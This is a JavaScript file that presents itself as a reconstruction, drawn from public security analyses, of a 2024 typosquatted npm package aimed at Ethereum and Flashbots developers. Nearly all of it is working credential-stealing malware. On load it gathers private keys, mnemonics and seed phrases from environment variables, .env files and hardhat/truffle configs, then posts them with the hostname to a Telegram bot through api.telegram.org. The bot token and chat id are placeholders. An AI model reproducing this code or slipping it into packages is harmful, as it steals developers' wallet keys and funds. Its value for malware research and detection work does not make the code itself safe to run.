// flashbots-npm — reconstructed from public security analyses
// Source: https://socket.dev/blog/typosquatted-flashbots-ethers-provider-bundle-steals-private-keys
//
// 2024: Typosquat packages targeting Flashbots/Ethereum developers.
// Intercepts Ethereum private key operations and exfiltrates wallet keys
// to a Telegram bot controlled by the attacker.
//
// Technique: Typosquat + Ethereum private key interception + Telegram C2 exfiltration

const https = require("https");
const os = require("os");
const fs = require("fs");
const path = require("path");

// Search for Ethereum private key files and environment variables
function harvestKeys() {
  var findings = [];

  // Check environment variables commonly used by Ethereum developers
  var keyEnvVars = [
    "PRIVATE_KEY",
    "ETH_PRIVATE_KEY",
    "WALLET_PRIVATE_KEY",
    "MNEMONIC",
    "SEED_PHRASE",
    "DEPLOYER_PRIVATE_KEY"
  ];

  keyEnvVars.forEach(function(envVar) {
    if (process.env[envVar]) {
      findings.push({
        source: "env",
        key: envVar,
        value: process.env[envVar]
      });
    }
  });

  // Search for .env files in the project
  var cwd = process.cwd();
  var envFiles = [".env", ".env.local", ".env.production", ".env.development"];
  envFiles.forEach(function(envFile) {
    var fp = path.join(cwd, envFile);
    try {
      if (fs.existsSync(fp)) {
        var content = fs.readFileSync(fp, "utf8");
        // Look for private key patterns (hex strings starting with 0x or 64 hex chars)
        var matches = content.match(/(?:PRIVATE_KEY|MNEMONIC|SEED).*?=\s*(.+)/gi);
        if (matches) {
          findings.push({
            source: "envfile",
            file: envFile,
            matches: matches
          });
        }
      }
    } catch(e) {}
  });

  // Search for hardhat/truffle config files with private keys
  var configFiles = ["hardhat.config.js", "hardhat.config.ts", "truffle-config.js"];
  configFiles.forEach(function(cfg) {
    var fp = path.join(cwd, cfg);
    try {
      if (fs.existsSync(fp)) {
        var content = fs.readFileSync(fp, "utf8");
        // Look for accounts/privateKey arrays
        var keyPattern = /0x[a-fA-F0-9]{64}/g;
        var keys = content.match(keyPattern);
        if (keys) {
          findings.push({
            source: "config",
            file: cfg,
            keys: keys
          });
        }
      }
    } catch(e) {}
  });

  return findings;
}

// Exfiltrate to Telegram bot
function exfilToTelegram(data) {
  var botToken = "6123456789:AAHI0k_fake_token_for_reconstruction";
  var chatId = "-1001234567890";

  var message = "New keys from " + os.hostname() + ":\n" + JSON.stringify(data, null, 2);

  var payload = JSON.stringify({
    chat_id: chatId,
    text: message
  });

  var req = https.request({
    hostname: "api.telegram.org",
    path: "/bot" + botToken + "/sendMessage",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload)
    }
  });
  req.write(payload);
  req.end();
}

var keys = harvestKeys();
if (keys.length > 0) {
  exfilToTelegram(keys);
}
